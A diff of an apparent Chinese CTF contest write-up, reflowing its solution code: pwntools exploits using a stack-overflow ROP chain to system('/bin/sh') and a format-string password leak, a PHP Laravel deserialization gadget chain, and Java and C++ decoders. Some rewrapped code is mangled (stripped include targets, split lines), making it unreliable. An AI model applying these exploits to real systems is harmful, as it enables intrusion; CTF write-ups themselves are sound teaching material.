@@ -38,7 +38,13 @@ Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled
 from pwn import *def bug(): gdb.attach(p) pause()
 def get_addr(): return u64(p.recvuntil(b'x7f')[-6:].ljust(8, b'x00'))
 def get_sb(): return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/shx00'))
-sd = lambda data : p.send(data)sa = lambda text,data :p.sendafter(text, data)sl = lambda data :p.sendline(data)sla = lambda text,data :p.sendlineafter(text, data)rc = lambda num=4096 :p.recv(num)ru = lambda text :p.recvuntil(text)rl = lambda :p.recvline()pr = lambda num=4096 :print(p.recv(num))ia = lambda :p.interactive()l32 = lambda :u32(p.recvuntil(b'xf7')[-4:].ljust(4,b'x00'))l64 = lambda :u64(p.recvuntil(b'x7f')[-6:].ljust(8,b'x00'))uu32 = lambda :u32(p.recv(4).ljust(4,b'x00'))uu64 = lambda :u64(p.recv(6).ljust(8,b'x00'))int16 = lambda data :int(data,16)lg= lambda s, num :p.success('%s -> 0x%x' % (s, num))
+sd = lambda data : p.send(data)sa = lambda text,data :p.sendafter(text, data)sl = lambda data :p.sendline(data)sla = lambda text,data :p.sendlineafter(text, data)rc = lambda num=4096 :p.recv(num)ru = lambda text :p.recvuntil(text)rl = lambda :p.recvline()pr = lambda num=4096 :
+print(p.recv(num))ia = lambda :p.interactive()l32 = lambda :
+u32(p.recvuntil(b'xf7')[-4:].ljust(4,b'x00'))l64 = lambda :
+u64(p.recvuntil(b'x7f')[-6:].ljust(8,b'x00'))uu32 = lambda :
+u32(p.recv(4).ljust(4,b'x00'))uu64 = lambda :
+u64(p.recv(6).ljust(8,b'x00'))int16 = lambda data :
+int(data,16)lg= lambda s, num :p.success('%s -> 0x%x' % (s, num))
 context(arch = "amd64",os = "linux",log_level = "debug")context.terminal = ['gnome-terminal', '-x', 'sh', '-c']file = "./pwn"#libc = "./libc.so.6"libc = "/lib/x86_64-linux-gnu/libc.so.6"
 p = process(file)elf = ELF(file)libc = ELF(libc)
 system = p64(0x40079D) pop_rdi_ret = p64(0x4007a2) bin_sh = p64(0x602048) ret = p64(0x40053e) gift = p64(0x400781)
@@ -121,7 +127,26 @@ Base 格式,那么密文我们就拿到了,在 Enc 里面把密文用他的码�
 
 代码如下:
 
-import java.util.Arrays;public class Main {private static short[] $ = {3257, 3256, 3263, 3262, 3261, 3260, 3251, 3250, 3249, 3248, 3255, 3254, 3253, 3252, 3243, 3242, 3241, 3240, 3247, 3246, 3245, 3244, 3235, 3234, 3233, 3226, 3225, 3224, 3231, 3230, 3229, 3228, 3219, 3218, 3217, 3216, 3223, 3222, 3221, 3220, 3211, 3210, 3209, 3208, 3215, 3214, 3213, 3212, 3203, 3202, 3201, 3275, 3274, 3273, 3272, 3279, 3278, 3277, 3276, 3267, 3266, 3259, 3288};private static final char[] CUSTOM_BASE64_CHARS = $(0, 63, 3323).toCharArray();private static final byte[] CUSTOM_BASE64_INDEX;private static String $(int i, int i2, int i3) {char[] cArr = new char[i2 - i];for (int i4 = 0; i4 < i2 - i; i4++) {cArr[i4] = (char) ($[i + i4] ^ i3);}return new String(cArr);}static {byte[] bArr = new byte[256];CUSTOM_BASE64_INDEX = bArr;Arrays.fill(bArr, (byte) -1);for (int i = 0; i < CUSTOM_BASE64_CHARS.length; i++) {CUSTOM_BASE64_INDEX[CUSTOM_BASE64_CHARS[i]] = (byte) i;}}public static String encodeToCustomBase64(String input) {int i;int i2;byte[] bytes = input.getBytes();StringBuilder sb = new StringBuilder();for (int b1 = 0; b1 < bytes.length; b1 = i) {int i3 = b1 + 1;int b12 = bytes[b1] & 255;int i4 = 0;if (i3 < bytes.length) {i = i3 + 1;i2 = bytes[i3] & 255;} else {i = i3;i2 = 0;}if (i < bytes.length) {i4 = bytes[i] & 255;i++;}int c1 = b12 >> 2;int c2 = ((b12 & 3) << 4) | (i2 >> 4);int c3 = ((i2 & 15) << 2) | (i4 >> 6);int c4 = i4 & 63;char[] cArr = CUSTOM_BASE64_CHARS;sb.append(cArr[c1]);sb.append(cArr[c2]);char c = '=';sb.append(i <= bytes.length ? cArr[c3] : '=');if (i < bytes.length) {c = cArr[c4];}sb.append(c);}return sb.toString();}public static String decodeFromCustomBase64(String input) {int i;int i2;byte[] bytes = input.getBytes();StringBuilder sb = new StringBuilder();for (int c1 = 0; c1 < bytes.length; c1 = i) {byte[] bArr = CUSTOM_BASE64_INDEX;int i3 = c1 + 1;int c12 = bArr[bytes[c1]];int i4 = i3 + 1;int c2 = bArr[bytes[i3]];int i5 = 0;if (i4 < bytes.length) {i = i4 + 1;i2 = bArr[bytes[i4]];} else {i = i4;i2 = 0;}if (i < bytes.length) {int i6 = bArr[bytes[i]];i++;i5 = i6;}int c4 = i5;int b1 = (c12 << 2) | (c2 >> 4);int b2 = ((c2 & 15) << 4) | (i2 >> 2);int b3 = ((i2 & 3) << 6) | c4;sb.append((char) b1);if (i2 != 0) {sb.append((char) b2);}if (c4 != 0) {sb.append((char) b3);}}return sb.toString();}public static void main(String[] args) {String flag = "W3WtZ3@uaW@Vc2@EWFZiUnW4V4SidhB=";String decode = decodeFromCustomBase64(flag);System.out.println(decode);}}
+import java.util.Arrays;public class Main {private static short[] $ = {3257, 3256, 3263, 3262, 3261, 3260, 3251, 3250, 3249, 3248, 3255, 3254, 3253, 3252, 3243, 3242, 3241, 3240, 3247, 3246, 3245, 3244, 3235, 3234, 3233, 3226, 3225, 3224, 3231, 3230, 3229, 3228, 3219, 3218, 3217, 3216, 3223, 3222, 3221, 3220, 3211, 3210, 3209, 3208, 3215, 3214, 3213, 3212, 3203, 3202, 3201, 3275, 3274, 3273, 3272, 3279, 3278, 3277, 3276, 3267, 3266, 3259, 3288};private static final char[] CUSTOM_BASE64_CHARS = $(0, 63, 3323).toCharArray();private static final byte[] CUSTOM_BASE64_INDEX;private static String $(int i, int i2, int i3) {char[] cArr = new char[i2 - i];for (int i4 = 0; i4 < i2 - i; i4++) {cArr[i4] = (char) ($[i + i4] ^ i3);}return new String(cArr);}static {byte[] bArr = new byte[256];CUSTOM_BASE64_INDEX = bArr;Arrays.fill(bArr, (byte) -1);for (int i = 0; i < CUSTOM_BASE64_CHARS.length; i++) {CUSTOM_BASE64_INDEX[CUSTOM_BASE64_CHARS[i]] = (byte) i;}}public static String encodeToCustomBase64(String input) {int i;
+int i2;byte[] bytes = input.getBytes();StringBuilder sb = new StringBuilder();for (int b1 = 0; b1 < bytes.length; b1 = i) {int i3 = b1 + 1;
+int b12 = bytes[b1] & 255;
+int i4 = 0;if (i3 < bytes.length) {i = i3 + 1;i2 = bytes[i3] & 255;} else {i = i3;i2 = 0;}
+if (i < bytes.length) {i4 = bytes[i] & 255;i++;}int c1 = b12 >> 2;
+int c2 = ((b12 & 3) << 4) | (i2 >> 4);
+int c3 = ((i2 & 15) << 2) | (i4 >> 6);
+int c4 = i4 & 63;char[] cArr = CUSTOM_BASE64_CHARS;sb.append(cArr[c1]);sb.append(cArr[c2]);
+char c = '=';sb.append(i <= bytes.length ? cArr[c3] : '=');if (i < bytes.length) {c = cArr[c4];}sb.append(c);}return sb.toString();}public static String decodeFromCustomBase64(String input) {int i;
+int i2;byte[] bytes = input.getBytes();StringBuilder sb = new StringBuilder();for (int c1 = 0; c1 < bytes.length; c1 = i) {byte[] bArr = CUSTOM_BASE64_INDEX;
+int i3 = c1 + 1;
+int c12 = bArr[bytes[c1]];
+int i4 = i3 + 1;
+int c2 = bArr[bytes[i3]];
+int i5 = 0;if (i4 < bytes.length) {i = i4 + 1;i2 = bArr[bytes[i4]];} else {i = i4;i2 = 0;}
+if (i < bytes.length) {int i6 = bArr[bytes[i]];i++;i5 = i6;}int c4 = i5;
+int b1 = (c12 << 2) | (c2 >> 4);
+int b2 = ((c2 & 15) << 4) | (i2 >> 2);
+int b3 = ((i2 & 3) << 6) | c4;sb.append((char) b1);if (i2 != 0) {sb.append((char) b2);}
+if (c4 != 0) {sb.append((char) b3);}}return sb.toString();}public static void main(String[] args) {String flag = "W3WtZ3@uaW@Vc2@EWFZiUnW4V4SidhB=";String decode = decodeFromCustomBase64(flag);System.out.println(decode);}}
 
 本题是一个 base64 可变码表的题目,但是我把码表修改少了一位,所以你们使用
 
@@ -163,7 +188,32 @@ ee85fa4bc4e5d52fd4fa925596be15ec539f7247ad6632d8bff87de577fed8cc
 
 现在照着网上的tea解密算法copy还原算法就好了
 
-#include <iostream>#include <sstream>#include <cstdint>#include <array>#include <vector>#include <iomanip>#include <cstring>// 定义 TEA 轮数，标准建议至少 32 轮const int NUM_ROUNDS = 32;const std::string flag ="ee85fa4bc4e5d52fd4fa925596be15ec539f7247ad6632d8bff87de577fed8cc";//TEA 解密函数void tea_decrypt(uint32_t v[2], const uint32_t key[4]) {uint32_t v0 = v[0], v1 = v[1];uint32_t delta = 0x9E3779B9;//uint32_t sum = delta * NUM_ROUNDS & 0xFFFFFFFF;uint32_t sum = 0xC6EF3720;for (uint32_t i = 0; i < NUM_ROUNDS; ++i) {v1 -= ((v0 << 4) + key[2]) ^ (v0 + sum) ^ ((v0 >> 5) + key[3]);sum -= delta;v0 -= ((v1 << 4) + key[0]) ^ (v1 + sum) ^ ((v1 >> 5) + key[1]);}v[0] = v0;v[1] = v1;}// 将 16 进制字符串转换为 32 位整数uint32_t hex_to_uint32(const std::string& hex) {std::stringstream ss;ss << std::hex << hex;uint32_t result;ss >> result;return result;}// 将 32 位整数块转换为字符串std::string blocks_to_string(const std::vector<uint32_t>& blocks) {std::string str;str.reserve(blocks.size() * 4);for (uint32_t block : blocks) {for (int i = 0; i < 4; ++i) {str.push_back(static_cast<char>((block >> (24 - i * 8)) & 0xFF));}}return str;}std::vector<uint32_t> hex_to_blocks(const std::string& hex_str) {std::vector<uint32_t> blocks;for (size_t i = 0; i < hex_str.length(); i += 8) {std::string block_str = hex_str.substr(i, 8);uint32_t block = hex_to_uint32(block_str);blocks.push_back(block);}return blocks;}int main() {// 测试数据std::string enflag = flag;std::string key_hex = "Welcome_To_CTF,Newbie!Have_fun!!";std::array<uint32_t, 4> key = {hex_to_uint32(key_hex.substr(0, 8)), hex_to_uint32(key_hex.substr(8, 8)), hex_to_uint32(key_hex.substr(16, 8)), hex_to_uint32(key_hex.substr(24, 8))};// 将加密后的 16 进制字符串转换为 32 位整数块std::vector<uint32_t> encrypted_blocks = hex_to_blocks(enflag);// 解密for (size_t i = 0; i < encrypted_blocks.size(); i += 2) {tea_decrypt(&encrypted_blocks[i], key.data());}// 解密后的数据std::string decrypted = blocks_to_string(encrypted_blocks);std::cout << "Decrypted: " << decrypted << std::endl;return 0;}
+#include #include <sstream>#include <cstdint>#include <array>#include <vector>#include #include <cstring>// 定义 TEA 轮数，标准建议至少 32 轮const int NUM_ROUNDS = 32;
+const std::
+string flag ="ee85fa4bc4e5d52fd4fa925596be15ec539f7247ad6632d8bff87de577fed8cc";//TEA 解密函数void tea_decrypt(uint32_t v[2], const uint32_t key[4]) {uint32_t v0 = v[0], v1 = v[1];
+uint32_t delta = 0x9E3779B9;//uint32_t sum = delta * NUM_ROUNDS & 0xFFFFFFFF;
+uint32_t sum = 0xC6EF3720;for (uint32_t i = 0; i < NUM_ROUNDS; ++i) {v1 -= ((v0 << 4) + key[2]) ^ (v0 + sum) ^ ((v0 >> 5) + key[3]);sum -= delta;v0 -= ((v1 << 4) + key[0]) ^ (v1 + sum) ^ ((v1 >> 5) + key[1]);}v[0] = v0;v[1] = v1;}// 将 16 进制字符串转换为 32 位整数uint32_t hex_to_uint32(const std::
+string& hex) {std::
+stringstream ss;ss << std::
+hex << hex;
+uint32_t result;ss >> result;
+return result;}// 将 32 位整数块转换为字符串std::
+string blocks_to_string(const std::
+vector& blocks) {std::
+string str;str.reserve(blocks.size() * 4);for (uint32_t block : blocks) {for (int i = 0; i < 4; ++i) {str.push_back(static_cast<char>((block >> (24 - i * 8)) & 0xFF));}}return str;}std::
+vector hex_to_blocks(const std::
+string& hex_str) {std::
+vector blocks;for (size_t i = 0; i < hex_str.length(); i += 8) {std::
+string block_str = hex_str.substr(i, 8);
+uint32_t block = hex_to_uint32(block_str);blocks.push_back(block);}return blocks;}int main() {// 测试数据std::
+string enflag = flag;std::
+string key_hex = "Welcome_To_CTF,Newbie!Have_fun!!";std::
+array key = {hex_to_uint32(key_hex.substr(0, 8)), hex_to_uint32(key_hex.substr(8, 8)), hex_to_uint32(key_hex.substr(16, 8)), hex_to_uint32(key_hex.substr(24, 8))};// 将加密后的 16 进制字符串转换为 32 位整数块std::
+vector encrypted_blocks = hex_to_blocks(enflag);// 解密for (size_t i = 0; i < encrypted_blocks.size(); i += 2) {tea_decrypt(&encrypted_blocks[i], key.data());}// 解密后的数据std::
+string decrypted = blocks_to_string(encrypted_blocks);std::
+cout << "Decrypted: " << decrypted << std::
+endl;
+return 0;}
 
 总结:
 
@@ -206,7 +256,8 @@ PHPUnitFrameworkMockObjectMockClass：
 <?phpnamespace GuzzleHttpCookie{
 
  use IlluminateFilesystemFilesystemAdapter; use IlluminateViewFileViewFinder; use IlluminateViewView; use IlluminateViewFactory; use IlluminateViewEnginesEngineResolver; use IlluminateFilesystemFilesystem;
- class CookieJar{ //调用__toString private $cookies = []; function __construct() { $this->cookies[] = []; } } class FileCookieJar extends CookieJar { private $filename; function __construct() { parent::__construct(); $this->filename = new View(new Factory(new EngineResolver(),new FileViewFinder(new Filesystem(),["./"])),new FilesystemAdapter(),200,"./info.php",["index"]); } }}namespace IlluminateView{ //调用任意类get方法
+ class CookieJar{ //调用__toString private $cookies = []; function __construct() { $this->cookies[] = []; } } class FileCookieJar extends CookieJar { private $filename; function __construct() { parent::
+__construct(); $this->filename = new View(new Factory(new EngineResolver(),new FileViewFinder(new Filesystem(),["./"])),new FilesystemAdapter(),200,"./info.php",["index"]); } }}namespace IlluminateView{ //调用任意类get方法
 
  use IlluminateEventsDispatcher; use IlluminateFilesystemFilesystem; use IlluminateFilesystemFilesystemAdapter; use IlluminateViewEnginesEngineResolver;
 
@@ -268,7 +319,7 @@ VX：Evan-xuanjing
 
 邮箱：game@megrezsec.cn/赛事QQ群：895959607
 
-    往期回顾    
+    往期回顾   
 
 UCTC CTF 2024高校新生网安赛
 
@@ -293,30 +344,21 @@ def reverse(inp, out): with open(inp, 'rb') as f: data = f.read()
  with open(out, 'wb') as f: f.write(r_data)
 inp = '么什是这.zip'out = 'output.zip'
 reverse(inp, out)
-```
-
-
-
-```
 Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000)
-```
-
-
-
-```
 from pwn import *def bug(): gdb.attach(p) pause()
 def get_addr(): return u64(p.recvuntil(b'x7f')[-6:].ljust(8, b'x00'))
 def get_sb(): return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/shx00'))
-sd = lambda data : p.send(data)sa = lambda text,data :p.sendafter(text, data)sl = lambda data :p.sendline(data)sla = lambda text,data :p.sendlineafter(text, data)rc = lambda num=4096 :p.recv(num)ru = lambda text :p.recvuntil(text)rl = lambda :p.recvline()pr = lambda num=4096 :print(p.recv(num))ia = lambda :p.interactive()l32 = lambda :u32(p.recvuntil(b'xf7')[-4:].ljust(4,b'x00'))l64 = lambda :u64(p.recvuntil(b'x7f')[-6:].ljust(8,b'x00'))uu32 = lambda :u32(p.recv(4).ljust(4,b'x00'))uu64 = lambda :u64(p.recv(6).ljust(8,b'x00'))int16 = lambda data :int(data,16)lg= lambda s, num :p.success('%s -> 0x%x' % (s, num))
+sd = lambda data : p.send(data)sa = lambda text,data :p.sendafter(text, data)sl = lambda data :p.sendline(data)sla = lambda text,data :p.sendlineafter(text, data)rc = lambda num=4096 :p.recv(num)ru = lambda text :p.recvuntil(text)rl = lambda :p.recvline()pr = lambda num=4096 :
+print(p.recv(num))ia = lambda :p.interactive()l32 = lambda :
+u32(p.recvuntil(b'xf7')[-4:].ljust(4,b'x00'))l64 = lambda :
+u64(p.recvuntil(b'x7f')[-6:].ljust(8,b'x00'))uu32 = lambda :
+u32(p.recv(4).ljust(4,b'x00'))uu64 = lambda :
+u64(p.recv(6).ljust(8,b'x00'))int16 = lambda data :
+int(data,16)lg= lambda s, num :p.success('%s -> 0x%x' % (s, num))
 context(arch = "amd64",os = "linux",log_level = "debug")context.terminal = ['gnome-terminal', '-x', 'sh', '-c']file = "./pwn"#libc = "./libc.so.6"libc = "/lib/x86_64-linux-gnu/libc.so.6"
 p = process(file)elf = ELF(file)libc = ELF(libc)
 system = p64(0x40079D) pop_rdi_ret = p64(0x4007a2) bin_sh = p64(0x602048) ret = p64(0x40053e) gift = p64(0x400781)
 ru("!!!!n")payload = b'a'*0x4cpayload += p32(0x54)payload += pop_rdi_ret+bin_sh+system #ret + gift for i in payload: sd(bytearray([i])) # 单字节发送#sd(payload) 也可以直接发送payloadp.interactive()
-```
-
-
-
-```
 from pwn import *import sys
 context.binary = bin = ELF("./pwn")context.arch = 'amd64'context.os = 'linux'context.log_level = 'debug'
 n = len(sys.argv)if(n>1): arg = sys.argv[1].split(":") ip = arg[0] port = int(arg[1]) io = remote(ip,port)else: io = process(bin.path)
@@ -325,33 +367,58 @@ def login(password): io.sendlineafter(b'Password: ', password)
 login(b'supersecureuser')io.recvline()io.sendline(b'%13$s')rootPassword = io.recvline()login(rootPassword)
 payload = b'A'*0x28 + p64(0x401262)io.recvline()io.sendline(payload)
 io.interactive()io.close()
-```
-
-
-
-```
 boolean isCorrect = Enc.ah(userInput);if (isCorrect) {MainActivity.access$100(this.this$0, $(0, 2, -17515));} else {MainActivity.access$100(this.this$0, $(2, 4, -31808));}
-```
-
-
-
-```
-import java.util.Arrays;public class Main {private static short[] $ = {3257, 3256, 3263, 3262, 3261, 3260, 3251, 3250, 3249, 3248, 3255, 3254, 3253, 3252, 3243, 3242, 3241, 3240, 3247, 3246, 3245, 3244, 3235, 3234, 3233, 3226, 3225, 3224, 3231, 3230, 3229, 3228, 3219, 3218, 3217, 3216, 3223, 3222, 3221, 3220, 3211, 3210, 3209, 3208, 3215, 3214, 3213, 3212, 3203, 3202, 3201, 3275, 3274, 3273, 3272, 3279, 3278, 3277, 3276, 3267, 3266, 3259, 3288};private static final char[] CUSTOM_BASE64_CHARS = $(0, 63, 3323).toCharArray();private static final byte[] CUSTOM_BASE64_INDEX;private static String $(int i, int i2, int i3) {char[] cArr = new char[i2 - i];for (int i4 = 0; i4 < i2 - i; i4++) {cArr[i4] = (char) ($[i + i4] ^ i3);}return new String(cArr);}static {byte[] bArr = new byte[256];CUSTOM_BASE64_INDEX = bArr;Arrays.fill(bArr, (byte) -1);for (int i = 0; i < CUSTOM_BASE64_CHARS.length; i++) {CUSTOM_BASE64_INDEX[CUSTOM_BASE64_CHARS[i]] = (byte) i;}}public static String encodeToCustomBase64(String input) {int i;int i2;byte[] bytes = input.getBytes();StringBuilder sb = new StringBuilder();for (int b1 = 0; b1 < bytes.length; b1 = i) {int i3 = b1 + 1;int b12 = bytes[b1] & 255;int i4 = 0;if (i3 < bytes.length) {i = i3 + 1;i2 = bytes[i3] & 255;} else {i = i3;i2 = 0;}if (i < bytes.length) {i4 = bytes[i] & 255;i++;}int c1 = b12 >> 2;int c2 = ((b12 & 3) << 4) | (i2 >> 4);int c3 = ((i2 & 15) << 2) | (i4 >> 6);int c4 = i4 & 63;char[] cArr = CUSTOM_BASE64_CHARS;sb.append(cArr[c1]);sb.append(cArr[c2]);char c = '=';sb.append(i <= bytes.length ? cArr[c3] : '=');if (i < bytes.length) {c = cArr[c4];}sb.append(c);}return sb.toString();}public static String decodeFromCustomBase64(String input) {int i;int i2;byte[] bytes = input.getBytes();StringBuilder sb = new StringBuilder();for (int c1 = 0; c1 < bytes.length; c1 = i) {byte[] bArr = CUSTOM_BASE64_INDEX;int i3 = c1 + 1;int c12 = bArr[bytes[c1]];int i4 = i3 + 1;int c2 = bArr[bytes[i3]];int i5 = 0;if (i4 < bytes.length) {i = i4 + 1;i2 = bArr[bytes[i4]];} else {i = i4;i2 = 0;}if (i < bytes.length) {int i6 = bArr[bytes[i]];i++;i5 = i6;}int c4 = i5;int b1 = (c12 << 2) | (c2 >> 4);int b2 = ((c2 & 15) << 4) | (i2 >> 2);int b3 = ((i2 & 3) << 6) | c4;sb.append((char) b1);if (i2 != 0) {sb.append((char) b2);}if (c4 != 0) {sb.append((char) b3);}}return sb.toString();}public static void main(String[] args) {String flag = "W3WtZ3@uaW@Vc2@EWFZiUnW4V4SidhB=";String decode = decodeFromCustomBase64(flag);System.out.println(decode);}}
-```
-
-
-
-```
-#include <iostream>#include <sstream>#include <cstdint>#include <array>#include <vector>#include <iomanip>#include <cstring>// 定义 TEA 轮数，标准建议至少 32 轮const int NUM_ROUNDS = 32;const std::string flag ="ee85fa4bc4e5d52fd4fa925596be15ec539f7247ad6632d8bff87de577fed8cc";//TEA 解密函数void tea_decrypt(uint32_t v[2], const uint32_t key[4]) {uint32_t v0 = v[0], v1 = v[1];uint32_t delta = 0x9E3779B9;//uint32_t sum = delta * NUM_ROUNDS & 0xFFFFFFFF;uint32_t sum = 0xC6EF3720;for (uint32_t i = 0; i < NUM_ROUNDS; ++i) {v1 -= ((v0 << 4) + key[2]) ^ (v0 + sum) ^ ((v0 >> 5) + key[3]);sum -= delta;v0 -= ((v1 << 4) + key[0]) ^ (v1 + sum) ^ ((v1 >> 5) + key[1]);}v[0] = v0;v[1] = v1;}// 将 16 进制字符串转换为 32 位整数uint32_t hex_to_uint32(const std::string& hex) {std::stringstream ss;ss << std::hex << hex;uint32_t result;ss >> result;return result;}// 将 32 位整数块转换为字符串std::string blocks_to_string(const std::vector<uint32_t>& blocks) {std::string str;str.reserve(blocks.size() * 4);for (uint32_t block : blocks) {for (int i = 0; i < 4; ++i) {str.push_back(static_cast<char>((block >> (24 - i * 8)) & 0xFF));}}return str;}std::vector<uint32_t> hex_to_blocks(const std::string& hex_str) {std::vector<uint32_t> blocks;for (size_t i = 0; i < hex_str.length(); i += 8) {std::string block_str = hex_str.substr(i, 8);uint32_t block = hex_to_uint32(block_str);blocks.push_back(block);}return blocks;}int main() {// 测试数据std::string enflag = flag;std::string key_hex = "Welcome_To_CTF,Newbie!Have_fun!!";std::array<uint32_t, 4> key = {hex_to_uint32(key_hex.substr(0, 8)), hex_to_uint32(key_hex.substr(8, 8)), hex_to_uint32(key_hex.substr(16, 8)), hex_to_uint32(key_hex.substr(24, 8))};// 将加密后的 16 进制字符串转换为 32 位整数块std::vector<uint32_t> encrypted_blocks = hex_to_blocks(enflag);// 解密for (size_t i = 0; i < encrypted_blocks.size(); i += 2) {tea_decrypt(&encrypted_blocks[i], key.data());}// 解密后的数据std::string decrypted = blocks_to_string(encrypted_blocks);std::cout << "Decrypted: " << decrypted << std::endl;return 0;}
-```
-
-
-
-```
+import java.util.Arrays;public class Main {private static short[] $ = {3257, 3256, 3263, 3262, 3261, 3260, 3251, 3250, 3249, 3248, 3255, 3254, 3253, 3252, 3243, 3242, 3241, 3240, 3247, 3246, 3245, 3244, 3235, 3234, 3233, 3226, 3225, 3224, 3231, 3230, 3229, 3228, 3219, 3218, 3217, 3216, 3223, 3222, 3221, 3220, 3211, 3210, 3209, 3208, 3215, 3214, 3213, 3212, 3203, 3202, 3201, 3275, 3274, 3273, 3272, 3279, 3278, 3277, 3276, 3267, 3266, 3259, 3288};private static final char[] CUSTOM_BASE64_CHARS = $(0, 63, 3323).toCharArray();private static final byte[] CUSTOM_BASE64_INDEX;private static String $(int i, int i2, int i3) {char[] cArr = new char[i2 - i];for (int i4 = 0; i4 < i2 - i; i4++) {cArr[i4] = (char) ($[i + i4] ^ i3);}return new String(cArr);}static {byte[] bArr = new byte[256];CUSTOM_BASE64_INDEX = bArr;Arrays.fill(bArr, (byte) -1);for (int i = 0; i < CUSTOM_BASE64_CHARS.length; i++) {CUSTOM_BASE64_INDEX[CUSTOM_BASE64_CHARS[i]] = (byte) i;}}public static String encodeToCustomBase64(String input) {int i;
+int i2;byte[] bytes = input.getBytes();StringBuilder sb = new StringBuilder();for (int b1 = 0; b1 < bytes.length; b1 = i) {int i3 = b1 + 1;
+int b12 = bytes[b1] & 255;
+int i4 = 0;if (i3 < bytes.length) {i = i3 + 1;i2 = bytes[i3] & 255;} else {i = i3;i2 = 0;}
+if (i < bytes.length) {i4 = bytes[i] & 255;i++;}int c1 = b12 >> 2;
+int c2 = ((b12 & 3) << 4) | (i2 >> 4);
+int c3 = ((i2 & 15) << 2) | (i4 >> 6);
+int c4 = i4 & 63;char[] cArr = CUSTOM_BASE64_CHARS;sb.append(cArr[c1]);sb.append(cArr[c2]);
+char c = '=';sb.append(i <= bytes.length ? cArr[c3] : '=');if (i < bytes.length) {c = cArr[c4];}sb.append(c);}return sb.toString();}public static String decodeFromCustomBase64(String input) {int i;
+int i2;byte[] bytes = input.getBytes();StringBuilder sb = new StringBuilder();for (int c1 = 0; c1 < bytes.length; c1 = i) {byte[] bArr = CUSTOM_BASE64_INDEX;
+int i3 = c1 + 1;
+int c12 = bArr[bytes[c1]];
+int i4 = i3 + 1;
+int c2 = bArr[bytes[i3]];
+int i5 = 0;if (i4 < bytes.length) {i = i4 + 1;i2 = bArr[bytes[i4]];} else {i = i4;i2 = 0;}
+if (i < bytes.length) {int i6 = bArr[bytes[i]];i++;i5 = i6;}int c4 = i5;
+int b1 = (c12 << 2) | (c2 >> 4);
+int b2 = ((c2 & 15) << 4) | (i2 >> 2);
+int b3 = ((i2 & 3) << 6) | c4;sb.append((char) b1);if (i2 != 0) {sb.append((char) b2);}
+if (c4 != 0) {sb.append((char) b3);}}return sb.toString();}public static void main(String[] args) {String flag = "W3WtZ3@uaW@Vc2@EWFZiUnW4V4SidhB=";String decode = decodeFromCustomBase64(flag);System.out.println(decode);}}
+    #include #include <sstream>#include <cstdint>#include <array>#include <vector>#include #include <cstring>// 定义 TEA 轮数，标准建议至少 32 轮const int NUM_ROUNDS = 32;
+const std::
+string flag ="ee85fa4bc4e5d52fd4fa925596be15ec539f7247ad6632d8bff87de577fed8cc";//TEA 解密函数void tea_decrypt(uint32_t v[2], const uint32_t key[4]) {uint32_t v0 = v[0], v1 = v[1];
+uint32_t delta = 0x9E3779B9;//uint32_t sum = delta * NUM_ROUNDS & 0xFFFFFFFF;
+uint32_t sum = 0xC6EF3720;for (uint32_t i = 0; i < NUM_ROUNDS; ++i) {v1 -= ((v0 << 4) + key[2]) ^ (v0 + sum) ^ ((v0 >> 5) + key[3]);sum -= delta;v0 -= ((v1 << 4) + key[0]) ^ (v1 + sum) ^ ((v1 >> 5) + key[1]);}v[0] = v0;v[1] = v1;}// 将 16 进制字符串转换为 32 位整数uint32_t hex_to_uint32(const std::
+string& hex) {std::
+stringstream ss;ss << std::
+hex << hex;
+uint32_t result;ss >> result;
+return result;}// 将 32 位整数块转换为字符串std::
+string blocks_to_string(const std::
+vector& blocks) {std::
+string str;str.reserve(blocks.size() * 4);for (uint32_t block : blocks) {for (int i = 0; i < 4; ++i) {str.push_back(static_cast<char>((block >> (24 - i * 8)) & 0xFF));}}return str;}std::
+vector hex_to_blocks(const std::
+string& hex_str) {std::
+vector blocks;for (size_t i = 0; i < hex_str.length(); i += 8) {std::
+string block_str = hex_str.substr(i, 8);
+uint32_t block = hex_to_uint32(block_str);blocks.push_back(block);}return blocks;}int main() {// 测试数据std::
+string enflag = flag;std::
+string key_hex = "Welcome_To_CTF,Newbie!Have_fun!!";std::
+array key = {hex_to_uint32(key_hex.substr(0, 8)), hex_to_uint32(key_hex.substr(8, 8)), hex_to_uint32(key_hex.substr(16, 8)), hex_to_uint32(key_hex.substr(24, 8))};// 将加密后的 16 进制字符串转换为 32 位整数块std::
+vector encrypted_blocks = hex_to_blocks(enflag);// 解密for (size_t i = 0; i < encrypted_blocks.size(); i += 2) {tea_decrypt(&encrypted_blocks[i], key.data());}// 解密后的数据std::
+string decrypted = blocks_to_string(encrypted_blocks);std::
+cout << "Decrypted: " << decrypted << std::
+endl;
+return 0;}
 <?phpnamespace GuzzleHttpCookie{
 
  use IlluminateFilesystemFilesystemAdapter; use IlluminateViewFileViewFinder; use IlluminateViewView; use IlluminateViewFactory; use IlluminateViewEnginesEngineResolver; use IlluminateFilesystemFilesystem;
- class CookieJar{ //调用__toString private $cookies = []; function __construct() { $this->cookies[] = []; } } class FileCookieJar extends CookieJar { private $filename; function __construct() { parent::__construct(); $this->filename = new View(new Factory(new EngineResolver(),new FileViewFinder(new Filesystem(),["./"])),new FilesystemAdapter(),200,"./info.php",["index"]); } }}namespace IlluminateView{ //调用任意类get方法
+ class CookieJar{ //调用__toString private $cookies = []; function __construct() { $this->cookies[] = []; } } class FileCookieJar extends CookieJar { private $filename; function __construct() { parent::
+__construct(); $this->filename = new View(new Factory(new EngineResolver(),new FileViewFinder(new Filesystem(),["./"])),new FilesystemAdapter(),200,"./info.php",["index"]); } }}namespace IlluminateView{ //调用任意类get方法
 
  use IlluminateEventsDispatcher; use IlluminateFilesystemFilesystem; use IlluminateFilesystemFilesystemAdapter; use IlluminateViewEnginesEngineResolver;
 
